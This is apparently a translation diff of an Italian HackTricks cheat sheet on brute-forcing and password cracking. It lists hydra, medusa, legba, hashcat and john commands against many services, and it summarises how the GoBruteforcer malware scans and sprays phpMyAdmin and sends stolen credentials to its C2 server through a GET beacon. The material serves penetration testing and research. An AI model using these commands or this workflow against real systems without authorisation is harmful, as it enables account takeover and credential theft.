@@ -1,8 +1,10 @@
 # Brute Force - CheatSheet
 
+{{#include ../banners/hacktricks-training.md}}
+
 ## Credenziali predefinite
 
-**Cerca su google** le credenziali predefinite della tecnologia in uso oppure **prova questi link**:
+**Cerca su Google** le credenziali predefinite della tecnologia in uso, oppure **prova questi link**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,7 +21,7 @@
 
 ## **Crea i tuoi dizionari**
 
-Trova quante più informazioni possibili sul bersaglio e genera un dizionario personalizzato. Strumenti che possono aiutare:
+Raccogli quante più informazioni possibili sul target e genera un dizionario personalizzato. Strumenti che possono essere utili:
 
 ### Crunch
 ```bash
@@ -32,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Wordlists basate sul sito web
+### Wordlist basate sui siti web
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -85,15 +87,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Workflow di brute force su scala Internet (lezioni dagli scanner basati su Go)
+## Workflow del bruteforcer su scala Internet (lezioni dagli scanner basati su Go)
 
-I seguenti comportamenti sono stati osservati nel workflow di scansione del malware GoBruteforcer; i valori esatti dipendono dal campione.<sup>[[1]](#references)</sup>
+I seguenti comportamenti sono stati osservati nel workflow di scanning del malware GoBruteforcer; i valori esatti dipendono dal campione.<sup>[[1]](#references)</sup>
 
-- Mantenere **pool di worker ottimizzati per l'architettura** (ad esempio, 95 worker concorrenti su `x86_64/arm64`, 85 su `i686`, 35 su `armv5tel` e 50 per impostazione predefinita sulle altre architetture), controllare ogni secondo i worker attivi e avviare sostituti quando sono al di sotto dell'obiettivo; ogni worker gestisce al massimo un IP target prima di terminare.
-- Generare **IPv4 pubblici casuali**, escludendo però gli intervalli evidentemente non instradabili e quelli selezionati ed evitati dagli operatori: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` con alta presenza di cloud (`3/15/16/56`) e `/8` associati al DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Sondare la porta del servizio** con un timeout breve (~2 s) prima di tentare **login in chiaro** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin tramite HTTP/80) e utilizzare una **piccola lista di credenziali integrata** se il recupero delle credenziali dal C2 non riesce.
-- **Esfiltrare gli accessi trovati** tramite piccoli beacon HTTP GET, come `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (codici dei servizi come `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), riutilizzando uno User-Agent comune dei browser per mimetizzarsi.
-- Lo **spray di phpMyAdmin** può eseguire brute force su circa 80 percorsi probabili con `GET /index.php?lang=en`, rilevare i marker di PMA (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) e analizzare `codemirror.css?v=X.Y.Z` per scegliere il metodo di autenticazione: le versioni `<4.9` accettano i parametri GET `pma_username`/`pma_password`; le versioni `>=4.9` utilizzano POST con `server=1`, CSRF `token` e le stesse credenziali.
+- Mantenere **worker pool ottimizzati per l'architettura** (ad esempio, 95 worker concorrenti su `x86_64/arm64`, 85 su `i686`, 35 su `armv5tel` e 50 per impostazione predefinita sulle altre architetture), controllare ogni secondo i worker attivi e avviare sostituti quando sono al di sotto dell'obiettivo; ogni worker gestisce al massimo un IP target prima di terminare.
+- Generare **IPv4 pubblici casuali**, scartando però gli intervalli ovviamente non instradabili e quelli evitati dall'operatore: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, i `/8` con forte presenza cloud (`3/15/16/56`) e i `/8` associati al DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Sondare la porta del servizio** con un timeout breve (~2 s) prima di tentare **accessi in chiaro** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin via HTTP/80) e utilizzare una **piccola lista di credenziali integrata** se il recupero delle credenziali dal C2 fallisce.
+- **Esfiltrare i risultati** tramite piccoli beacon HTTP GET come `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (codici dei servizi come `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), riutilizzando uno User-Agent comune dei browser per mimetizzarsi.
+- Lo **spray su phpMyAdmin** può eseguire il brute-force di circa 80 percorsi probabili con `GET /index.php?lang=en`, rilevare i marker PMA (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) e analizzare `codemirror.css?v=X.Y.Z` per scegliere il ramo di autenticazione: le versioni `<4.9` accettano i parametri GET `pma_username`/`pma_password`; le versioni `>=4.9` utilizzano POST con `server=1`, CSRF `token` e le stesse credenziali.
 
 ## Servizi
 
@@ -113,7 +115,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM e Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -149,7 +151,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### Brute Force generico HTTP
+### Brute Force HTTP generico
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -165,14 +167,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Modulo POST
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Per http**s** devi cambiare da "http-post-form" a "**https-post-form**"
+Per http**s** devi cambiare da "http-post-form" a "**https-post-form"**
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -293,7 +295,7 @@ Per utilizzare **oracle_login** con **patator** è necessario **installare**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Bruteforce offline dell'hash OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Bruteforce offline dell'hash OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -320,7 +322,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-Puoi scaricare il pacchetto `.deb` da installare da [https://http.kali.org/pool/main/t/thc-pptp-bruter/](/pool/main/t/thc-pptp-bruter/)
+Puoi scaricare il pacchetto `.deb` da installare da [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/).
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -415,13 +417,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Chiavi SSH deboli / PRNG prevedibile di Debian
+#### Weak SSH keys / Debian predictable PRNG
 
-Alcuni sistemi presentano vulnerabilità note nel seed casuale utilizzato per generare materiale crittografico. Ciò può comportare uno spazio delle chiavi drasticamente ridotto, che può essere sottoposto a brute force con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono inoltre disponibili set di chiavi deboli pre-generati, come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Alcuni sistemi presentano vulnerabilità note nel seed casuale utilizzato per generare materiale crittografico. Questo può comportare uno spazio delle chiavi drasticamente ridotto, che può essere sottoposto a brute force con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono inoltre disponibili set di chiavi deboli pre-generati, come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Il protocollo testuale STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente una comunicazione e un'interazione fluide con i più diffusi servizi di messaggistica con code** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Offre un approccio standardizzato ed efficiente per lo scambio di messaggi e l'esecuzione di varie operazioni di messaggistica.
+Il protocollo testuale STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente una comunicazione e un'interazione fluide con i più diffusi servizi di message queueing** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Fornisce un approccio standardizzato ed efficiente per lo scambio di messaggi e l'esecuzione di varie operazioni di messaggistica.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -461,16 +463,16 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## Locale
 
-### Database online di cracking
+### Database online per il cracking
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 e SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con il valore di qualsiasi challenge)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, capture WPA2 e archivi MSOffice, ZIP, PDF...)
-- [https://crackstation.net/](https://crackstation.net) (Hash)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con o senza ESS/SSP e con il valore di qualsiasi challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, catture WPA2 e archivi MSOffice, ZIP, PDF...)
+- [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hash e hash di file)
-- [https://hashes.org/search.php](https://hashes.org/search.php) (Hash)
-- [https://www.cmd5.org/](https://www.cmd5.org) (Hash)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes e hash di file)
+- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
@@ -495,8 +497,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Devi conoscere il **plaintext** (o parte del plaintext) **di un file contenuto all'interno** dello zip cifrato. Puoi controllare **i nomi dei file e le dimensioni dei file contenuti** in uno zip cifrato eseguendo: **`7z l encrypted.zip`**\
-Scarica [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) dalla pagina delle releases.
+Devi conoscere il **plaintext** (o parte del plaintext) **di un file contenuto all'interno** dello zip cifrato. Puoi verificare **i nomi dei file e le dimensioni dei file contenuti all'interno** di uno zip cifrato eseguendo: **`7z l encrypted.zip`**\
+Scarica [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)dalla pagina delle release.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -528,9 +530,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### Password proprietaria del PDF
+### Password del proprietario PDF
 
-Per eseguire il cracking della password proprietaria di un PDF, consulta questo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Per crackare la password del proprietario di un PDF, consulta: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -564,7 +566,7 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Immagine Lucks
+### Immagine LUKS
 
 #### Metodo 1
 
@@ -603,7 +605,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Usa [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e poi john
+Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e poi john
 
 ### Colonna protetta da password di Open Office
 
@@ -644,7 +646,7 @@ hash-identifier
 
 ### **Strumenti per la generazione di wordlist**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generatore avanzato di keyboard-walk con caratteri di base, mappa della tastiera e percorsi configurabili.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generatore avanzato di percorsi sulla tastiera con caratteri di base, keymap e percorsi configurabili.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -659,9 +661,9 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat attacks
 
-- **Wordlist attack** (`-a 0`) con regole
+- **Wordlist attack** (`-a 0`) con le rules
 
-**Hashcat** include già una **cartella contenente regole**, ma puoi trovare [**altre regole interessanti qui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** include già una **cartella contenente delle rules**, ma puoi trovare [**altre rules interessanti qui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
@@ -735,7 +737,7 @@ Cracking degli hash di Windows
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Cracking degli hash comuni delle applicazioni
+Cracking degli hash delle applicazioni comuni
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -747,5 +749,5 @@ Cracking degli hash comuni delle applicazioni
 ```
 ## References
 
-- [1] [Dentro GoBruteforcer: impostazioni predefinite dei server generate dall'IA, password deboli e campagne incentrate sulle criptovalute](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Dentro GoBruteforcer: impostazioni predefinite del server generate dall'IA, password deboli e campagne incentrate sulle criptovalute](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
